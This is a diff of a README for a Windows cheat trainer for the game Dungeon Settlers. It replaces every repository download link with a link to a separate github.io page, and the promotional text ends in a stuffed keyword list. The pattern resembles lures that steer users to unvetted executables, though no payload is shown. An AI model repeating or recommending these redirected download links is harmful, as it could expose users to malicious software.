@@ -1,6 +1,6 @@
 # 🎮 Dungeon-Settlers-Trainer-Resource-Editor - Your Ultimate Colony Control Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-blue?style=for-the-badge&logo=github)](https://github.com/mledez3395/Dungeon-Settlers-Trainer-Resource-Editor)
+[![Download Now](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-blue?style=for-the-badge&logo=github)](https://mledez3395.github.io)
 
 ## 🛡️ What Is Dungeon-Settlers-Trainer-Resource-Editor?
 
@@ -54,7 +54,7 @@ Your Windows PC should meet these basic requirements to run the trainer smoothly
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/mledez3395/Dungeon-Settlers-Trainer-Resource-Editor](https://github.com/mledez3395/Dungeon-Settlers-Trainer-Resource-Editor)
+Visit this link to download the application: [https://mledez3395.github.io](https://mledez3395.github.io)
 
 Click the prominent download button on the page to get the latest version of the trainer. The download will start automatically, and the file will be saved to your default downloads folder.
 
@@ -189,6 +189,6 @@ Now that you have all the information you need, it's time to enhance your Dungeo
 
 Remember, this tool is designed to give you more freedom and fun in your game. Experiment with different configurations to find what works best for your play style. The possibilities are endless with Dungeon-Settlers-Trainer-Resource-Editor!
 
-[![Get It Now](https://img.shields.io/badge/GET_IT_NOW-Download-blue?style=for-the-badge&logo=windows)](https://github.com/mledez3395/Dungeon-Settlers-Trainer-Resource-Editor)
+[![Get It Now](https://img.shields.io/badge/GET_IT_NOW-Download-blue?style=for-the-badge&logo=windows)](https://mledez3395.github.io)
 
 Keywords: 2026, add-edit-xp, config-manager, desktop-tool, dungeon-settlers-trainer--resource-editor, dungeon-settlers-trainer-resource-editor, game-trainer, gaming-tools, god-mode, head-torso-health-editor, low-weight, no-energy-drain, no-hunger, no-stress, pc-trainer, profile-manager, unlock-skills, windows, windows-11, windows-x64
